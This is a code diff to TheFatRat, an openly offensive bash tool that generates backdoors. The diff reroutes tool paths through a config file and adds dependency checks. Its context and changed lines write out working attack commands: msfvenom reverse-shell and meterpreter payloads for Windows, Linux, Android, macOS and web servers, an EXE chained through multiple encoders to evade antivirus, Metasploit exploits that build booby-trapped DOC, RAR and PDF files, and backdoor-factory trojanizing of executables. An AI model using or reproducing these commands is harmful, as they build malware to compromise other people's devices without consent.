@@ -1,5 +1,15 @@
 #!/usr/bin/env bash
-
+file="config.path"
+if [ -f "$file" ]
+then
+msfconsole=`sed -n 5p config.path`	
+msfvenom=`sed -n 6p config.path`
+backdoor=`sed -n 7p config.path`
+searchsploit=`sed -n 8p config.path`
+else
+	echo "Configuration file does not exists , run setup.sh first ."
+exit 1
+fi
 #============================================================================================================
 #	THEFATRAT
 #
@@ -26,7 +36,7 @@ BlueF='\e[1;34m'
 
 
 #Checking
-[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
+[[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; }
 resize -s 33 84 > /dev/null
 clear
 
@@ -200,15 +210,15 @@ fi
 # check apache if exists
       which apache2 > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
-      echo [✔]::[apache2 Server $distro ]: installation found!;
+      echo [✔]::[Apache2 Server $distro ]: installation found!;
 else
 
-   echo [x]::[warning]:this script require monodevelop & dmcs to work ;
+   echo [x]::[warning]:this script require apache2 to work ;
    echo ""
-   echo [!]::[please wait]: please run setup.sh .... ;
+   echo [!]::Run setup.sh to install apache2 ;
    echo ""
    sleep 2
-   exit
+   exit 1
 fi
 sleep 2
 
@@ -224,28 +234,30 @@ sleep 2
     fi
 
 # check msfconsole
-      which msfconsole > /dev/null 2>&1
+      which $msfconsole > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
-      echo [✔]::[msfconsole]: installation found!;
+      echo [✔]::[Msfconsole]: installation found!;
 else
 
-   echo [x]::[warning]:this script require  msfconsole installed to work ;
+   echo [x]::[warning]:this script require msfconsole installed to work ;
    echo ""
-   echo [!]::[please wait]: Downloading from network... ;
+   echo [!]::Run setup.sh to install metasploit-framework ;
    sleep 3
+exit 1
 fi
 sleep 2
 
 # check if msfvenom exists
-      which msfvenom > /dev/null 2>&1
+      which $msfvenom > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
-      echo [✔]::[msfvenom]: installation found!;
+      echo [✔]::[Msfvenom]: installation found!;
 else
 
-   echo [x]::[warning]:this script require  msfvenom installed to work ;
+   echo [x]::[warning]:this script require msfvenom installed to work ;
    echo ""
-   echo [!]::[please wait]: Downloading from network... ;
+   echo [!]::Run setup.sh to install metasploit-framework ;
    sleep 3
+exit 1
 fi
 sleep 2
 
@@ -258,64 +270,63 @@ else
 
    echo [x]::[warning]:this script require zenity installed to work ;
    echo ""
-   echo [!]::[please wait]: please Download Zenity.... ;
-   su $user -c "xdg-open http://www.tecmint.com/zenity-creates-graphical-gtk-dialog-boxes-in-command-line-and-shell-scripts/" > /dev/null 2>&1
+   echo [!]::Run setup.sh to install zenity ;
    echo ""
    sleep 2
-   exit
+   exit 1
 fi
 sleep 2
 
 # check mingw if exists
       which i586-mingw32msvc-gcc > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
-      echo [✔]::[mingw32]: installation found!;
+      echo [✔]::[Mingw32]: installation found!;
       COMPILER="i586-mingw32msvc-gcc"
 else
       which i686-w64-mingw32-gcc > /dev/null 2>&1
       if [ $? -eq 0 ]; then
-      echo [✔]::[mingw32]: installation found!;
+      echo [✔]::[Mingw32]: installation found!;
       COMPILER="i686-w64-mingw32-gcc"
 else
    echo [x]::[warning]:this script require mingw32 installed to work ;
    echo ""
-   echo [!]::[please wait]: please run setup.sh .... ;
+   echo [!]::Run setup.sh to install ming32 ;
    sleep 2
-   exit
+   exit 1
  fi
 fi
 sleep 2
 
 
 # check backdoor-factory if exists
-      which backdoor-factory > /dev/null 2>&1
+      which $backdoor > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
-      echo [✔]::[backdoor-factory]: installation found!;
+      echo [✔]::[Backdoor-factory]: installation found!;
 
 else
 
    echo [x]::[warning]:this script require backdoor-factory installed to work ;
    echo ""
-   echo [!]::[please wait]: please run setup.sh .... ;
+   echo [!]::Run setup.sh to install backdoor-factory ;
    echo ""
    sleep 2
-   exit
+   exit 1
 fi
 sleep 2
 
 # check ruby if exists
       which ruby > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
-      echo [✔]::[ruby]: installation found!;
+      echo [✔]::[Ruby]: installation found!;
 
 else
 
-   echo [x]::[warning]:this script require rubyinstalled to work ;
+   echo [x]::[warning]:this script require ruby installed to work ;
    echo ""
-   echo [!]::[please wait]: please run setup.sh .... ;
+   echo [!]::Run setup.sh to install ruby ;
    echo ""
    sleep 2
-   exit
+   exit 1
 fi
 sleep 2
 
@@ -323,34 +334,78 @@ sleep 2
       which monodevelop > /dev/null 2>&1
       which dmcs > /dev/null 2>&1
       if [ -d $find ]; then
-      echo [✔]::[monodevelop]: installation found!;
+      echo [✔]::[Monodevelop]: installation found!;
 
 else
 
    echo [x]::[warning]:this script require monodevelop to work ;
    echo ""
-   echo [!]::[please wait]: please run setup.sh .... ;
+   echo [!]::Run setup.sh to install monodevelop ;
    echo ""
    sleep 2
-   exit
+   exit 1
 fi
 sleep 2
 
 # check xterm if exists
       which xterm > /dev/null 2>&1
       if [ -d $find ]; then
-      echo [✔]::[xterm]: installation found!;
+      echo [✔]::[Xterm]: installation found!;
 
 else
 
    echo [x]::[warning]:this script require xterm to work ;
    echo ""
-   echo [!]::[please wait]: please install xterm .... ;
+   echo [!]::Run setup.sh to install xterm ;
    echo ""
    sleep 2
-   exit
+   exit 1
 fi
 
+# check gnome-terminal if exists
+      which gnome-terminal > /dev/null 2>&1
+      if [ -d $find ]; then
+      echo [✔]::[Gnome-terminal]: installation found!;
+
+else
+
+   echo [x]::[warning]:this script require gnome-terminal to work ;
+   echo ""
+   echo [!]::Run setup.sh to install gnome-terminal ;
+   echo ""
+   sleep 2
+   exit 1
+fi
+
+# check apktool if exists
+      which apktool > /dev/null 2>&1
+      if [ -d $find ]; then
+      echo [✔]::[Apktool]: installation found!;
+
+else
+
+   echo [x]::[warning]:this script require apktool to work ;
+   echo ""
+   echo [!]::Run setup.sh to install apktool ;
+   echo ""
+   sleep 2
+   exit 1
+fi
+
+# check upx if exists
+      which upx > /dev/null 2>&1
+      if [ -d $find ]; then
+      echo [✔]::[Upx]: installation found!;
+
+else
+
+   echo [x]::[warning]:this script require upx to work ;
+   echo ""
+   echo [!]::Run setup.sh to install upx ;
+   echo ""
+   sleep 2
+   exit 1
+fi
 
 #WARNING !!!
 clear
@@ -432,6 +487,7 @@ if [ "$distro" = "Kali" ]; then
 /etc/init.d/metasploit start > /dev/null 2>&1
 /etc/init.d/apache2 start > /dev/null 2>&1
 else
+/etc/init.d/postgresql start > /dev/null 2>&1
 /etc/init.d/metasploit start > /dev/null 2>&1
 /etc/init.d/apache2 start > /dev/null 2>&1
 fi
@@ -447,6 +503,7 @@ function Stop() {
   else
   /etc/init.d/metasploit stop > /dev/null 2>&1
   /etc/init.d/apache2 stop > /dev/null 2>&1
+  /etc/init.d/postgresql stop > /dev/null 2>&1
   fi
 
 }
@@ -501,7 +558,7 @@ echo ""
 				spinlong
 				echo ""
 				echo ""
-         			msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > output/$fira.elf
+         			$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > output/$fira.elf
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '2'
 				then
@@ -516,7 +573,7 @@ echo ""
 				spinlong
 				echo ""
 				echo ""
-				msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o output/$fira.exe
+				$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | $msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | $msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| $msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | $msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o output/$fira.exe
 				echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '3'
 				then
@@ -531,7 +588,7 @@ echo ""
 				spinlong
 				echo ""
 				echo ""
-				msfvenom -p android/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.apk
+				$msfvenom -p android/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.apk
 				echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '4'
 				then
@@ -546,7 +603,7 @@ echo ""
 				spinlong
 				echo ""
 				echo ""
-         			msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > output/$fira.macho
+         			$msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > output/$fira.macho
           			echo -e "Shell Saved To outputFolder "
 			elif test $fatrat1 == '5'
 				then
@@ -561,7 +618,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p php/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.php
+         			$msfvenom -p php/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.php
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '6'
 				then
@@ -576,7 +633,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > output/$fira.asp
+         			$msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > output/$fira.asp
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '7'
 				then
@@ -591,7 +648,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > output/$fira.jsp
+         			$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > output/$fira.jsp
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '8'
 				then
@@ -606,7 +663,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > output/$fira.war
+         			$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > output/$fira.war
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '9'
 				then
@@ -621,7 +678,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > output/$fira.py
+         			$msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > output/$fira.py
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '10'
 				then
@@ -636,7 +693,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > output/$fira.sh
+         			$msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > output/$fira.sh
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '11'
 				then
@@ -651,7 +708,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > output/$fira.pl
+         			$msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > output/$fira.pl
           			echo -e "Shell Saved To output Folder "
 
      			elif test $fatrat1 == '12'
@@ -675,7 +732,7 @@ echo ""
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set payload $payloads ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'" > /dev/null 2>&1
+         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set payload $payloads ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'" > /dev/null 2>&1
          				echo ""
          				mv ~/.msf4/local/$fira.doc $path/output/$fira.doc
          				echo -e $okegreen""
@@ -708,7 +765,7 @@ echo ""
   					gboor
   					spinlong
   					echo ""
-           				 xterm -T " TheFatRat < RAR BUILDER > " -geometry 110x23 -e "msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set payload $payloads; set FILENAME $fira; set SPOOF $fira2; set lhost $yourip; set lport $yourport; exploit; exit -y'" > /dev/null 2>&1
+           				 xterm -T " TheFatRat < RAR BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set payload $payloads; set FILENAME $fira; set SPOOF $fira2; set lhost $yourip; set lport $yourport; exploit; exit -y'" > /dev/null 2>&1
            				 echo ""
            				 mv ~/.msf4/local/$fira $path/output/$fira
            				 echo -e $okegreen""
@@ -776,7 +833,7 @@ echo -e $okegreen"  ============================================================
            	 		echo set LPORT $uservar >> "temp/meterpreter_linux.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_linux.rc"
            	 		echo exploit -j  >> "temp/meterpreter_linux.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_linux.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_linux.rc" &
 				clear
 			elif test $fatrat1 == '2' #Windows
 				then
@@ -794,7 +851,7 @@ echo -e $okegreen"  ============================================================
 				echo set AutoRunScript multi_console_command -rc $path/postexploit/$pe >> "temp/meterpreter_windows.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_windows.rc"
            	 		echo exploit -j  >> "temp/meterpreter_windows.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_windows.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_windows.rc" &
 				clear
 			elif test $fatrat1 == '3'  #Mac
 				then
@@ -809,7 +866,7 @@ echo -e $okegreen"  ============================================================
            	 		echo set LPORT $uservar >> "temp/meterpreter_mac.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_mac.rc"
            	 		echo exploit -j  >> "temp/meterpreter_mac.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_mac.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_mac.rc" &
 				clear
 
 			elif test $fatrat1 == '4' #Android
@@ -826,7 +883,7 @@ echo -e $okegreen"  ============================================================
            	 		echo set LPORT $uservar >> "temp/meterpreter_android.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_android.rc"
            	 		echo exploit -j  >> "temp/meterpreter_android.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_android.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_android.rc" &
 				clear
 
 			elif test $fatrat1 == '5'
@@ -1139,7 +1196,7 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					$COMPILER -Wall -mwindows icons/icon.res $pdfcom -o "$path/output/backdoor_for_pdf.exe" > /dev/null 2>&1
 					sleep 2
 					echo " Wait for embed exe to pdf ....  "
-					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
+					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
 					echo ""
 					mv ~/.msf4/local/$fira.pdf $path/output/$fira.pdf
 					rm unicorn.rc powershell_attack.txt
@@ -1493,8 +1550,8 @@ clear
 
 # User options
 PAYLOAD="windows/meterpreter/reverse_tcp" # The payload to use
-MSFVENOM=`which msfvenom` # Path to the msfvenom script
-MSFCONSOLE=`which msfconsole` # Path to the msfconsole script
+MSFVENOM="$msfvenom" # Path to the msfvenom script
+MSFCONSOLE="$msfconsole" # Path to the msfconsole script
 
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
@@ -1878,7 +1935,7 @@ menu () {
   				spinlong2
   				echo ""
   				echo -e $okegreen""
-  				backdoor-factory -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
+  				$backdoor -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
                                   echo -e "Shell Saved To /backdoored/output/  press any key to continue"
   				read bebeku
   				clear
@@ -1898,7 +1955,7 @@ menu () {
 
   		elif test $fatrat == '8'
    			then
-   			xterm -fa monaco -fs 13 -bg black msfconsole
+   			xterm -fa monaco -fs 13 -bg black -e "$msfconsole"
 
   		elif test $fatrat == '9'
    			then
@@ -1906,7 +1963,7 @@ menu () {
    			echo -e "\033[31mWhat do you want to Hack Today?\033[m"
   			echo -e "\033[31mEnter a search term and hit Enter\033[m"
   			read searchterm
-  			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
+  			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "$searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
   			menu
 
       elif test $fatrat == '10'
@@ -2076,7 +2133,7 @@ echo
 				spinlong2
 				echo ""
 				echo -e $okegreen""
-				backdoor-factory -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
+				$backdoor -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
                                 echo -e "Shell Saved To /backdoored/output/  press any key to continue"
 				read bebeku
 				clear
@@ -2096,7 +2153,7 @@ echo
 
 		elif test $fatrat == '8'
  			then
- 			xterm -fa monaco -fs 13 -bg black msfconsole
+ 			xterm -fa monaco -fs 13 -bg black $msfconsole
 
 		elif test $fatrat == '9'
  			then
@@ -2104,7 +2161,7 @@ echo
  			echo -e "\033[31mWhat do you want to Hack Today?\033[m"
 			echo -e "\033[31mEnter a search term and hit Enter\033[m"
 			read searchterm
-			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
+			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "$searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
 			menu
 
     elif test $fatrat == '10'
